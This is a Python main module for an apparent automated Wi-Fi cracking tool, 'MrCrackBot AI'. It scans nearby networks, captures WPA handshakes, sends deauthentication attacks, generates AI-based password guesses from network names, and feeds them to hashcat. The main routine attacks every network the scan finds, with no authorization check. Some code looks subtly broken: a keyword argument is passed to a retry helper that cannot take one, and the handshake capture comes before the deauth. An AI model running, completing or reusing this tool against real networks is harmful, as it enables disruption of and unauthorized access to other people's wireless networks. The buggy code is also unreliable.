"""
MrCrackBot AI - Main Module
Handles core functionality and workflow management.
"""

import asyncio
import logging
from contextlib import asynccontextmanager
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List

import aiofiles

from ai.feature_extractor import extract_features
from ai.password_model import generate_password_guesses
from cracking.hashcat_wrapper import crack_password
from network.deauth import deauth_attack
from network.handshake import capture_handshake
from network.scanner import scan_networks
from ui.intro import run_intro
from ui.main_window import MainWindow
from utils.config import Config

logging.basicConfig(
    filename="mr_crackbot_ai.log",
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)


@dataclass
class NetworkTarget:
    """Data class for storing network target information."""
    ssid: str
    bssid: str
    channel: int
    handshake_file: str = None
    wordlist_file: str = None


class CrackBotCore:
    """Core class handling main application logic and operations."""

    def __init__(self, config: Config) -> None:
        self.config = config
        self.progress_callback = None
        self.retry_count = 3
        self.retry_delay = 2

    async def update_progress(
        self, stage: str, progress: float, message: str
    ) -> None:
        """Update progress information and log status."""
        if self.progress_callback:
            await self.progress_callback(stage, progress, message)
        logger.info(f"{stage}: {message} ({progress}%)")

    @asynccontextmanager
    async def resource_manager(self, resource_type: str):
        """Manage resource lifecycle and cleanup."""
        try:
            logger.info(f"Acquiring {resource_type} resources")
            yield
        finally:
            logger.info(f"Cleaning up {resource_type} resources")
            if resource_type == "temp_files":
                await self.cleanup_temp_files()

    async def retry_operation(self, operation, *args):
        """Execute operation with retry logic."""
        for attempt in range(self.retry_count):
            try:
                return await operation(*args)
            except Exception as e:
                delay = self.retry_delay * (2 ** attempt)
                logger.warning(f"Operation failed: {e}. Retrying in {delay}s...")
                await asyncio.sleep(delay)
        raise RuntimeError(f"Operation failed after {self.retry_count} attempts")

    async def scan_networks_async(self) -> List[NetworkTarget]:
        """Scan for available networks asynchronously."""
        async with self.resource_manager("network_scan"):
            networks = await self.retry_operation(scan_networks)
            return [NetworkTarget(**network) for network in networks]

    async def process_network(self, target: NetworkTarget) -> None:
        """Process individual network target."""
        async with self.resource_manager("network_processing"):
            target.handshake_file = await self.retry_operation(
                capture_handshake, target.bssid, target.channel
            )

            await self.update_progress(
                "deauth", 0, f"Starting deauth on {target.ssid}"
            )
            await self.retry_operation(deauth_attack, target.bssid)

            features = await self.retry_operation(
                extract_features, target.ssid, target.bssid
            )

            target.wordlist_file = await self.generate_wordlist(target, features)
            await self.crack_password_async(target)

    async def generate_wordlist(
        self, target: NetworkTarget, features: Dict
    ) -> str:
        """Generate and save wordlist for target network."""
        metadata = {
            "ssid": target.ssid,
            "bssid": target.bssid,
            "parameters": features,
        }

        wordlist = await self.retry_operation(generate_password_guesses, metadata)
        wordlist_file = Path(self.config.temp_dir) / f"wordlist_{target.bssid}.txt"

        async with aiofiles.open(wordlist_file, "w") as f:
            await f.write("\n".join(wordlist))

        return str(wordlist_file)

    async def crack_password_async(self, target: NetworkTarget) -> None:
        """Execute password cracking process."""
        combined_wordlist = self.config.get_combined_wordlist_path()
        await self.retry_operation(
            crack_password,
            target.handshake_file,
            combined_wordlist,
            progress_callback=self.update_progress,
        )

    async def cleanup_temp_files(self) -> None:
        """Clean up temporary files."""
        temp_dir = Path(self.config.temp_dir)
        for file in temp_dir.glob("*"):
            try:
                file.unlink()
            except Exception as e:
                logger.error(f"Failed to cleanup {file}: {e}")


async def main() -> None:
    """Main application entry point."""
    # Automatically load configuration from YAML file
    config_file_path = "config.yaml"
    config = Config.load_from_file(config_file_path)

    core = CrackBotCore(config)

    run_intro()

    try:
        networks = await core.scan_networks_async()
        for network in networks:
            await core.process_network(network)
    except Exception as e:
        logger.error(f"Workflow error: {e}")
    finally:
        await core.cleanup_temp_files()

    app = MainWindow(core)
    await app.run_async()


if __name__ == "__main__":
    asyncio.run(main())

